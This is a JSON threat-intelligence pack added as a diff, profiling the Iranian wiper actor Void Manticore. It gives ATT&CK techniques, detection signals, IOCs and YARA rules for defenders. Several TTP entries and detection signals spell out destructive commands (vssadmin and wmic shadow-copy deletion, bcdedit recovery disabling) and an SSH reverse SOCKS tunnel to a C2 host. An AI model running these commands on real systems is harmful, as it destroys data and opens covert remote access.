@@ -1,0 +1,425 @@
+{
+  "report_title": "Void Manticore (Storm-842) Actor Intelligence Pack \u2014 Stage-1 CTI Extraction",
+  "source": "Check Point Research, 'Bad Karma, No Justice: Void Manticore Destructive Activities in Israel', Nikita Rostovcev / CPR team, 2024-05-20 (https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/). Corroborated by Check Point Blog 'Unveiling Void Manticore: Structured Collaboration Between Espionage and Destruction in MOIS' (https://blog.checkpoint.com/research/unveiling-void-manticore-structured-collaboration-between-espionage-and-destruction-in-mois/), The Hacker News 'Iranian MOIS-Linked Hackers Behind Destructive Attacks on Albania and Israel' 2024-05 (https://thehackernews.com/2024/05/iranian-mois-linked-hackers-behind.html), and SOCRadar 'Dark Web Profile: Storm-842 (Void Manticore)' (https://socradar.io/blog/dark-web-profile-storm-842-void-manticore/). Microsoft tracks this actor as Storm-0842 and its espionage partner as Storm-0861 (Scarred Manticore). No MITRE ATT&CK G-id exists for Void Manticore; the TTP set is extracted directly from the Check Point report narrative and its IOC/YARA appendix.",
+  "publication_date": "2026-08-30",
+  "actor": {
+    "name": "Void Manticore",
+    "mitre_id": "",
+    "mitre_canonical_name": "",
+    "aliases": [
+      "Void Manticore",
+      "Storm-842",
+      "Storm-0842",
+      "Karma",
+      "KarMa",
+      "Homeland Justice"
+    ],
+    "related_clusters": [
+      "Scarred Manticore (Storm-861 / Storm-0861) \u2014 espionage/initial-access partner that hands off victims to Void Manticore for destruction",
+      "Karma / KarMa \u2014 hack-and-leak influence persona used for Israel operations (BiBi wiper)",
+      "Homeland Justice \u2014 hack-and-leak influence persona used for Albania operations (Cl Wiper, No-Justice/LowEraser)"
+    ],
+    "attribution": "Iranian threat actor affiliated with the Ministry of Intelligence and Security (MOIS), per Check Point Research and Microsoft (tracked as Storm-0842). A destructive + influence actor that combines custom wiper deployment with hack-and-leak psychological operations. Check Point documents a systematic 'handoff' in which Scarred Manticore (Storm-0861) performs initial access, long-dwell espionage and email exfiltration, then transfers the compromised victim (web shells + Domain Admin credentials) to Void Manticore, which executes the destructive phase. The same one-two-punch pattern was observed by Microsoft in the 2022 Albania attacks and by Check Point in the 2023-2024 Israel attacks.",
+    "attribution_confidence": "high",
+    "targeted_regions_mena": [
+      "Israel"
+    ],
+    "targeted_regions_global": [
+      "Albania"
+    ],
+    "targeted_sectors": [
+      "Government",
+      "Public sector / national statistics (INSTAT Albania)",
+      "Critical infrastructure",
+      "Enterprises / high-value Israeli organizations (40+ claimed by Karma)"
+    ],
+    "key_campaigns": [
+      {
+        "name": "Albania destructive attacks (Homeland Justice)",
+        "date": "July 2022; recurring late 2023 and early 2024",
+        "summary": "Storm-0861 (Scarred Manticore) obtained initial access via CVE-2019-0604 and exfiltrated email, then handed off to Void Manticore, which deployed the Cl Wiper (cl.exe abusing the ElRawDisk rwdsk.sys driver) plus ransomware, leaking data under the 'Homeland Justice' persona. Later Albania attacks (incl. INSTAT) used partition wipers internally named LowEraser (No-Justice Wiper, PDB-based) and Pinky, some signed by 'Attest Inspection Limited'.",
+        "source_url": "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      },
+      {
+        "name": "Israel destructive + leak campaign (Karma / BiBi wiper)",
+        "date": "October 2023 through 2024",
+        "summary": "Following Scarred Manticore initial access via CVE-2019-0604 and email exfiltration (LionHead/LionTail), Void Manticore was handed the victims and deployed the custom BiBi wiper (BiBi-Linux-Wiper bibi-linux.out and BiBi-Windows-Wiper bibi.exe), partition wipers (JustMBR), and performed manual destruction (Windows Explorer deletion, SysInternals SDelete, Windows Format Quick/Full). Stolen data was leaked under the 'Karma'/'KarMa' persona via Telegram and the Karmabelow80 website, claiming 40+ Israeli victims. Access used web shells (homebrew 'Karma Shell', public reGeorge) and a hard-coded Domain Admin binary (do.exe).",
+        "source_url": "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      }
+    ]
+  },
+  "threat_actors": [
+    "Void Manticore",
+    "Storm-842",
+    "Karma",
+    "Homeland Justice"
+  ],
+  "targeted_regions": [
+    "Israel",
+    "Albania"
+  ],
+  "targeted_sectors": [
+    "Government",
+    "Public sector",
+    "Critical infrastructure",
+    "Enterprise"
+  ],
+  "malware": [
+    "BiBi-Windows-Wiper (bibi.exe)",
+    "BiBi-Linux-Wiper (bibi-linux.out)",
+    "Cl Wiper (cl.exe, abuses ElRawDisk rwdsk.sys / RawDisk3 service)",
+    "Partition Wiper \u2014 JustMBR (Israel variant)",
+    "Partition Wiper \u2014 LowEraser / No-Justice Wiper (Albania)",
+    "Partition Wiper \u2014 Pinky (Albania / INSTAT variant)",
+    "Karma Shell (homebrew web shell masquerading as an error page)",
+    "reGeorge (public SOCKS tunneling web shell)",
+    "do.exe (hard-coded Domain Admin credential validator / reGeorge deployer)"
+  ],
+  "tooling_observed": [
+    "RDP (mstsc / built-in)",
+    "OpenSSH client (reverse SOCKS proxy over port 443)",
+    "SysInternals AD Explorer",
+    "SysInternals SDelete",
+    "Windows Format utility (Quick / Full format)",
+    "Windows File Explorer (manual deletion)",
+    "WinRAR (unpack do.zip toolset)",
+    "vssadmin / wmic shadowcopy (shadow-copy deletion)",
+    "bcdedit (recovery inhibition)",
+    "ElRawDisk driver (rwdsk.sys)",
+    "cmd.exe",
+    "ping.exe"
+  ],
+  "ttps": [
+    {
+      "technique_id": "T1585.001",
+      "technique_name": "Establish Accounts: Social Media Accounts",
+      "tactic": "resource-development",
+      "procedure_description": "Void Manticore built and operated hack-and-leak influence personas \u2014 'Karma'/'KarMa' (Telegram channel + Karmabelow80 website, posing as an 'Anti-Zionist Jewish Hackers' group) for Israel and 'Homeland Justice' for Albania \u2014 to leak stolen data and amplify the psychological impact of its destructive attacks.",
+      "observed_tooling": [],
+      "detection_feasibility": "low \u2014 persona/account creation on third-party platforms is off-victim and invisible to defender telemetry; hunt candidate via brand-monitoring and leak-site tracking only",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1583",
+      "technique_name": "Acquire Infrastructure",
+      "tactic": "resource-development",
+      "procedure_description": "Void Manticore stood up external C2 servers (reached over SSH on port 443) and leak websites (e.g. Karmabelow80). Following the handoff, a distinct set of attacker IPs began accessing the victim network, separate from Scarred Manticore's infrastructure.",
+      "observed_tooling": [],
+      "detection_feasibility": "low \u2014 adversary infrastructure acquisition is not observable in host logs; hunt candidate via inbound-connection ASN/geo anomaly analytics on internet-facing servers",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "tactic": "initial-access",
+      "procedure_description": "Initial access to victim networks was obtained via exploitation of an internet-facing application (CVE-2019-0604, Microsoft SharePoint) \u2014 performed by the espionage partner Scarred Manticore (Storm-0861) and then handed off to Void Manticore. Void Manticore's own access was established through an internet-facing web server on which it planted web shells.",
+      "observed_tooling": [],
+      "detection_feasibility": "medium \u2014 exploitation of the known CVE-2019-0604 is detectable via IPS/WAF signatures and unpatched-SharePoint version telemetry, and anomalous web-server child processes, though n-day edge exploitation often precedes visibility",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1078.002",
+      "technique_name": "Valid Accounts: Domain Accounts",
+      "tactic": "initial-access",
+      "procedure_description": "One of Void Manticore's first observed actions was the use of a Domain Admin account handed to it during the transfer. The bespoke binary do.exe carried hard-coded Domain Admin credentials and validated them before deploying a further web shell \u2014 strong evidence the domain access was supplied by the partner rather than independently obtained.",
+      "observed_tooling": [
+        "do.exe"
+      ],
+      "detection_feasibility": "low \u2014 authentication with legitimate Domain Admin credentials blends with normal admin activity; hunt candidate via Domain Admin logon from an unusual host (web server), off-hours use, and new-source correlation",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "tactic": "persistence",
+      "procedure_description": "Void Manticore deployed web shells on internet-facing servers for access and command relay: a homebrew 'Karma Shell' (masquerading as an HTTP error page; capable of listing directories, creating processes, uploading files, and start/stop/list of services) and the publicly available reGeorge tunneling web shell, copied into the web directory by do.exe after Domain Admin validation.",
+      "observed_tooling": [
+        "Karma Shell",
+        "reGeorge",
+        "do.exe"
+      ],
+      "detection_feasibility": "high \u2014 new web-shell files in web-root paths and an IIS/web worker process spawning cmd.exe are strong, well-covered detection signals",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1059.003",
+      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
+      "tactic": "execution",
+      "procedure_description": "Void Manticore executed follow-on commands through Karma Shell via cmd.exe /c, including reconnaissance (net user /domain, ping), unpacking tooling with WinRAR, and launching payloads (e.g. cmd.exe /c C:\\Programdata\\do.exe).",
+      "observed_tooling": [
+        "Karma Shell",
+        "cmd.exe",
+        "WinRAR"
+      ],
+      "detection_feasibility": "high \u2014 cmd.exe spawned by a web-server worker process, with these command lines, is a classic web-shell command-execution detection",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "tactic": "command-and-control",
+      "procedure_description": "The attacker used Karma Shell's upload_file function to stage tooling on the compromised server (do.exe, do.zip, an additional reGeorge web shell), then unpacked do.zip with WinRAR and executed do.exe.",
+      "observed_tooling": [
+        "Karma Shell",
+        "do.exe",
+        "WinRAR"
+      ],
+      "detection_feasibility": "medium \u2014 file uploads written by a web-server process to ProgramData followed by archive extraction and execution are detectable via file-create and process-lineage telemetry",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1140",
+      "technique_name": "Deobfuscate/Decode Files or Information",
+      "tactic": "stealth",
+      "procedure_description": "Karma Shell decodes attacker-supplied parameters at runtime using base64 followed by a one-byte XOR (key 0x17). The BiBi wiper stores all of its command strings reversed and un-reverses them at runtime to hinder static analysis.",
+      "observed_tooling": [
+        "Karma Shell",
+        "BiBi-Windows-Wiper"
+      ],
+      "detection_feasibility": "low \u2014 in-memory decode of parameters leaves little host telemetry; hunt candidate via static/sample analysis and web-content inspection rather than log-based detection",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1027",
+      "technique_name": "Obfuscated Files or Information",
+      "tactic": "stealth",
+      "procedure_description": "The BiBi wiper stores its embedded command strings (vssadmin/wmic/bcdedit invocations) in reverse-byte form inside the binary so that plain-string scanning does not surface the destructive commands.",
+      "observed_tooling": [
+        "BiBi-Windows-Wiper"
+      ],
+      "detection_feasibility": "low \u2014 reversed/obfuscated strings defeat naive string signatures; hunt candidate via sample analysis (the reversed command strings themselves are a durable YARA anchor)",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1036",
+      "technique_name": "Masquerading",
+      "tactic": "stealth",
+      "procedure_description": "The homebrew Karma Shell masquerades as a benign HTTP error page (via its page title and content) to avoid drawing attention on the compromised web server.",
+      "observed_tooling": [
+        "Karma Shell"
+      ],
+      "detection_feasibility": "low \u2014 a web shell disguised as an error page evades casual review; hunt candidate via web-content anomaly analysis and comparison of served files against known-good baselines",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1553.002",
+      "technique_name": "Subvert Trust Controls: Code Signing",
+      "tactic": "stealth",
+      "procedure_description": "The Albania partition wiper internally named LowEraser (No-Justice Wiper) was digitally signed by 'Attest Inspection Limited', and its file icon matched that company's website logo \u2014 abusing a code-signing identity to appear legitimate.",
+      "observed_tooling": [
+        "LowEraser / No-Justice Wiper"
+      ],
+      "detection_feasibility": "medium \u2014 execution of a signed binary from an unexpected publisher for the environment is detectable via signature-issuer allow-listing and certificate-reputation analytics",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1087.002",
+      "technique_name": "Account Discovery: Domain Accounts",
+      "tactic": "discovery",
+      "procedure_description": "Void Manticore enumerated domain accounts via Karma Shell using 'net user <username> /domain' and collected broader Active Directory information using SysInternals AD Explorer on compromised hosts.",
+      "observed_tooling": [
+        "cmd.exe",
+        "AD Explorer"
+      ],
+      "detection_feasibility": "medium \u2014 net /domain enumeration and AD Explorer's characteristic bulk LDAP directory reads are detectable via command-line and LDAP-query volume telemetry, though they overlap with admin activity",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "tactic": "discovery",
+      "procedure_description": "The attacker ran connectivity checks through Karma Shell, using ping.exe against an external resolver (4.2.2.4) and microsoft.com to confirm the compromised host's outbound network reachability and environment before proceeding.",
+      "observed_tooling": [
+        "ping.exe",
+        "cmd.exe"
+      ],
+      "detection_feasibility": "low \u2014 ping is ubiquitous and benign in isolation; only meaningful when parented by a web-server/web-shell process, which is the hunt pivot",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "tactic": "lateral-movement",
+      "procedure_description": "Void Manticore performed hands-on-keyboard lateral movement primarily via RDP after deploying the reGeorge tunneling web shell, using the handed-off Domain Admin access to reach additional hosts before deploying wipers.",
+      "observed_tooling": [
+        "RDP",
+        "reGeorge"
+      ],
+      "detection_feasibility": "medium \u2014 RDP sourced from an internet-facing web server or tunneled through a web shell is anomalous lateral movement detectable via internal-RDP and tunnel analytics",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1090.001",
+      "technique_name": "Proxy: Internal Proxy",
+      "tactic": "command-and-control",
+      "procedure_description": "Void Manticore deployed the reGeorge web shell to create a SOCKS proxy/tunnel into the internal network, routing follow-on operator traffic (including RDP) through the compromised internet-facing server.",
+      "observed_tooling": [
+        "reGeorge"
+      ],
+      "detection_feasibility": "medium \u2014 a web server relaying SOCKS/tunneled internal traffic shows anomalous internal connection fan-out and long-lived sessions from a web-worker process, detectable via network and process-network correlation",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1572",
+      "technique_name": "Protocol Tunneling",
+      "tactic": "command-and-control",
+      "procedure_description": "On some hosts Void Manticore established a C2 channel with an OpenSSH client configured as a reverse SOCKS proxy over port 443, e.g. 'ssh root@<C2> -R 1090 -p 443 -o ServerAliveInterval=60' and '-R 1080', tunneling operator access through an HTTPS-looking port.",
+      "observed_tooling": [
+        "OpenSSH client"
+      ],
+      "detection_feasibility": "medium \u2014 outbound SSH on port 443 with reverse-tunnel (-R) options from a server is anomalous and detectable via egress protocol/port-mismatch and process-command-line telemetry",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1485",
+      "technique_name": "Data Destruction",
+      "tactic": "impact",
+      "procedure_description": "Void Manticore's defining objective. Beyond automated wipers, it performed manual data destruction using seemingly legitimate utilities: deleting files via Windows File Explorer, secure-wiping with SysInternals SDelete, and using the Windows Format utility ('Quick Format' to corrupt the partition and 'Full' format to destroy partition and content). Leaked data amplifies the destruction.",
+      "observed_tooling": [
+        "SDelete",
+        "Windows File Explorer",
+        "Windows Format utility"
+      ],
+      "detection_feasibility": "low \u2014 hands-on deletion with built-in tools (Explorer, format, SDelete) closely resembles legitimate admin action and is largely a hunt problem; correlate with prior Domain Admin RDP and wiper staging on the same host",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1561.001",
+      "technique_name": "Disk Wipe: Disk Content Wipe",
+      "tactic": "impact",
+      "procedure_description": "Cl Wiper (cl.exe) installs the ElRawDisk driver rwdsk.sys as a service (RawDisk3) and issues IOCTLs 0x227F80 / 0x22BF84 to overwrite the physical drive contents with a predefined buffer (filled with '0'). The BiBi wipers overwrite target file contents with buffers of random data across multiple threads (BiBi-Linux avoids .out/.so; BiBi-Windows avoids .exe/.dll/.sys) and rename files with the '.BiBi<1-5>' / '.bb<random>' extension.",
+      "observed_tooling": [
+        "Cl Wiper",
+        "ElRawDisk driver (rwdsk.sys)",
+        "BiBi-Windows-Wiper",
+        "BiBi-Linux-Wiper"
+      ],
+      "detection_feasibility": "medium \u2014 load of the ElRawDisk rwdsk.sys driver / creation of a 'RawDisk3' service, and mass multithreaded file-content overwrite with mass rename to a fixed extension, are detectable via driver-load and file-modification-burst telemetry, though the overwrite is concurrent with impact",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1561.002",
+      "technique_name": "Disk Wipe: Disk Structure Wipe",
+      "tactic": "impact",
+      "procedure_description": "Void Manticore's partition wipers (JustMBR in Israel; LowEraser/No-Justice and Pinky in Albania) iterate over physical disks and send IOCTL_DISK_DELETE_DRIVE_LAYOUT (0x7C100), removing MBR signatures or wiping both the primary GPT header (sector 1) and the backup GPT table (last sector), causing a BSOD and boot failure. Later BiBi wiper variants (Feb 2024) incorporated the same partition-wiping code.",
+      "observed_tooling": [
+        "Partition Wiper (JustMBR)",
+        "LowEraser / No-Justice Wiper",
+        "Pinky",
+        "BiBi-Windows-Wiper"
+      ],
+      "detection_feasibility": "high \u2014 a user-mode process opening a raw \\\\.\\PhysicalDrive handle and issuing IOCTL_DISK_DELETE_DRIVE_LAYOUT / writing to the MBR/GPT is a rare, high-fidelity destructive signal via EDR raw-disk-write analytics",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1490",
+      "technique_name": "Inhibit System Recovery",
+      "tactic": "impact",
+      "procedure_description": "The BiBi-Windows-Wiper deletes shadow copies with 'vssadmin delete shadows /quIet /all' and 'wmic shadowcopy delete', and disables Windows automatic recovery with 'bcdedit /set {default} bootstatuspolicy ignoreallfailures' followed by 'bcdedit /set {default} recoveryenabled no' (command strings stored reversed in the binary).",
+      "observed_tooling": [
+        "BiBi-Windows-Wiper",
+        "vssadmin",
+        "wmic",
+        "bcdedit"
+      ],
+      "detection_feasibility": "high \u2014 vssadmin/wmic shadow-copy deletion and bcdedit recovery-disabling are high-fidelity, well-covered wiper/ransomware precursors and among the most reliable early-warning detections",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    },
+    {
+      "technique_id": "T1529",
+      "technique_name": "System Shutdown/Reboot",
+      "tactic": "impact",
+      "procedure_description": "After the partition table is corrupted, the affected system crashes with a blue screen of death and fails to boot on the subsequent reboot due to the destroyed partition layout \u2014 the terminal step that renders endpoints inoperable.",
+      "observed_tooling": [
+        "Partition Wiper (JustMBR)",
+        "BiBi-Windows-Wiper"
+      ],
+      "detection_feasibility": "low \u2014 crash/reboot on its own is common; only meaningful as the terminal event of a wipe chain, so it is a correlation hunt against preceding raw-disk-write and recovery-inhibition events",
+      "sources": [
+        "https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/"
+      ]
+    }
+  ],
+  "detection_signals": [
+    "New web-shell file in an IIS/web root, especially one whose served content masquerades as an HTTP error page (Karma Shell) or a reGeorge tunneling shell, followed by the web-worker process spawning cmd.exe",
+    "cmd.exe /c invocations parented by a web-server process running 'net user <user> /domain', ping to 4.2.2.4 / microsoft.com, WinRAR extraction of do.zip, or execution of C:\\ProgramData\\do.exe",
+    "Domain Admin logon originating from an internet-facing web server, or a binary validating hard-coded Domain Admin credentials (do.exe hand-off indicator)",
+    "OpenSSH client launched with reverse-tunnel options over port 443 (ssh -R 1080/1090 -p 443 -o ServerAliveInterval=60) \u2014 SOCKS C2 tunnel",
+    "SysInternals AD Explorer executing bulk LDAP directory reads shortly after web-shell access",
+    "Load of the ElRawDisk driver rwdsk.sys and/or creation of a service named 'RawDisk3' (Cl Wiper)",
+    "User-mode process opening a raw \\\\.\\PhysicalDrive handle and issuing IOCTL_DISK_DELETE_DRIVE_LAYOUT (0x7C100) or writing to the MBR/GPT (partition wipers / late BiBi variants)",
+    "Mass multithreaded file-content overwrite with mass rename to a fixed '.BiBi<1-5>' or '.bb<random>' extension (Windows) / '.BiBi' extension (Linux bibi-linux.out)",
+    "'vssadmin delete shadows /quIet /all' and 'wmic shadowcopy delete' followed by 'bcdedit /set {default} bootstatuspolicy ignoreallfailures' and 'bcdedit /set {default} recoveryenabled no' \u2014 BiBi recovery inhibition",
+    "SysInternals SDelete execution, or Windows Format utility Quick/Full format, or bulk Windows Explorer deletion on a server host preceded by Domain Admin RDP \u2014 manual data destruction",
+    "Execution of a partition/wiper binary signed by an unexpected publisher (e.g. 'Attest Inspection Limited') for the environment"
+  ],
+  "iocs": {
+    "ips": [
+      "64.176.169.22",
+      "64.176.172.235",
+      "64.176.172.165",
+      "64.176.173.77",
+      "64.176.172.101"
+    ],
+    "domains": [],
+    "emails": [],
+    "hashes": [
+      "D0C03D40772CD468325BBC522402F7B737F18B8F37A89BACC5C8A00C2B87BFC6",
+      "DEEAF85B2725289D5FC262B4F60DDA0C68AE42D8D46D0DC19B9253B451AEA25A",
+      "87F0A902D6B2E2AE3647F10EA214D19DB9BD117837264AE15D622B5314FF03A5",
+      "85FA58CC8C4560ADB955BA0AE9B9D6CAB2C381D10DBD42A0BCEB8B62A92B7636",
+      "74D8D60E900F931526A911B7157511377C0A298AF986D42D373F51AAC4F362F6",
+      "CC77E8AB73B577DE1924E2F7A93BCFD852B3C96C6546229BC8B80BF3FD7BF24E",
+      "40417e937cd244b2f928150cae6fa0eff5551fdb401ea072f6ecdda67a747e17"
+    ],
+    "cves": [
+      "CVE-2019-0604"
+    ]
+  },
+  "yara_rules": [
+    "rule APT_IR_VoidManticore_JustMbr\n{\n meta:\n description = \"A wiper destroying the MBR partition table used by VoidManticore\"\n hash = \"cc77e8ab73b577de1924e2f7a93bcfd852b3c96c6546229bc8b80bf3fd7bf24e\"\n strings:\n $rich_header = {7B 20 15 F1 3F 41 7B A2 3F 41 7B A2 3F 41 7B A2}\n $format_string = \"DiskHandle: %d, Wiped: %d, Error: %d\"\n $physical_drive = {5C 5C 2E 5C 50 68 79 73 69 63 61 6C 44 72 69 76 65 25 64 00}\n $ioctl_code = {BA 00 C1 07 00 48 ?? ?? ?? ?? 48 8B CF}\n condition:\n $rich_header or $format_string or ($physical_drive and $ioctl_code)\n}",
+    "rule APT_IR_VoidManticore_BibiWiper\n{\n meta:\n description = \"A wiper used by VoidManticore having BB extensions\"\n hash = \"40417e937cd244b2f928150cae6fa0eff5551fdb401ea072f6ecdda67a747e17\"\n strings:\n $commands_1 = \"lla/ teIuq/ swodahs eteled nimdassv c/ exe.dmc\" ascii\n $commands_2 = \"eteled ypocwodahs cimw c/ exe.dmc\" ascii\n $commands_3 = \"seruliafllaerongi ycilopsutatstoob }tluafed{ tes / tidedcb c / exe.dmc\" ascii\n $commands_4 = \"on delbaneyrevocer }tluafed{ tes/ tidedcb c/ exe.dmc\" ascii\n $string_stats = \"[+] Stats: %d | %d\"\n $string_cpucores = \"[+] CPU cores: %d, Threads: %d\"\n $string_cpucores_2 = \"[+] CPU: %d , Threads: %d\"\n $string_diskname = \"DiskName: %s, Deleted: %d - %d\"\n $string_waiting_queue = \"[!] Waiting For Queue \"\n condition:\n uint16(0) == 0x5A4D and\n uint32(uint32(0x3C)) == 0x00004550 and\n (3 of ($commands_*) or any of ($string_*))\n}"
+  ],
+  "confidence": "high",
+  "notes": "Extraction is single-vendor-primary (Check Point Research, 2024-05-20) but corroborated on attribution, personas, the Scarred-Manticore handoff, and the MOIS nexus by Microsoft (Storm-0842/Storm-0861 tracking), The Hacker News, and SOCRadar \u2014 hence high confidence. NO MITRE G-id exists for Void Manticore, so actor.mitre_id and actor.mitre_canonical_name are intentionally empty strings. 21 techniques extracted across 9 tactics. FRAMEWORK/ENV CONVENTIONS: defense-evasion is emitted as the 'stealth' tactic per this environment; every technique_id was verified True against this build's bundled sigma.data.mitre_attack dataset before emission. This actor's Impair-Defenses behavior is limited \u2014 the report documents recovery inhibition (bcdedit) and shadow-copy deletion, which are Impact (T1490), not the defense-impairment family; no T1685.* / T1686.003 was cited by the source, so none was invented. IMPACT SET (the actor's core): T1485 Data Destruction (manual Explorer deletion, SDelete, Windows Format Quick/Full), T1561.001 Disk Content Wipe (Cl Wiper via ElRawDisk rwdsk.sys IOCTL 0x227F80/0x22BF84 buffer overwrite; BiBi random-data file overwrite), T1561.002 Disk Structure Wipe (partition wipers JustMBR/LowEraser/Pinky via IOCTL_DISK_DELETE_DRIVE_LAYOUT 0x7C100 on MBR/GPT; adopted into late BiBi variants), T1490 Inhibit System Recovery (vssadmin/wmic + bcdedit), T1529 System Shutdown/Reboot (BSOD/boot failure). HANDOFF / RELATED CLUSTERS: Void Manticore (Storm-0842) is the DESTRUCTION half of a documented two-actor 'one-two punch'; Scarred Manticore (Storm-0861) performs CVE-2019-0604 initial access, >1-year dwell espionage, and email exfiltration (Foxshell/Liontail/LionHead), then hands the victim \u2014 web shells + Domain Admin credentials \u2014 to Void Manticore. The do.exe hard-coded Domain Admin binary is the technical fingerprint of that handoff. CVE-2019-0604 is attributed to the partner's initial-access step (included as the campaign-enabling CVE). LOW-feasibility techniques route to HUNTING (T1585.001, T1583, T1078.002, T1140, T1027, T1036, T1016, T1485, T1529); MEDIUM/HIGH route to DETECTION, with the highest-value early-warning detections being T1490 (shadow-copy + bcdedit), T1561.002 (raw PhysicalDrive / DELETE_DRIVE_LAYOUT), T1505.003 (web-shell drop), and T1572/T1090.001 (SSH-443 reverse SOCKS tunnel). IOCs are taken verbatim from the report's IOC appendix (5 IPs; 6 SHA-256 hashes) plus one additional BiBi SHA-256 (40417e93...) cited in the report's YARA meta \u2014 no IOCs were fabricated; no domains or emails were published (leak-persona URLs like Karmabelow80 are narrative, not appendix IOCs, so domains[] is left empty). Both YARA rules (APT_IR_VoidManticore_JustMbr, APT_IR_VoidManticore_BibiWiper) are extracted verbatim from the report, including the reversed cmd string signatures. IOC hashes retained in their report-original case (mixed) per the no-defang / no-normalize rule."
+}
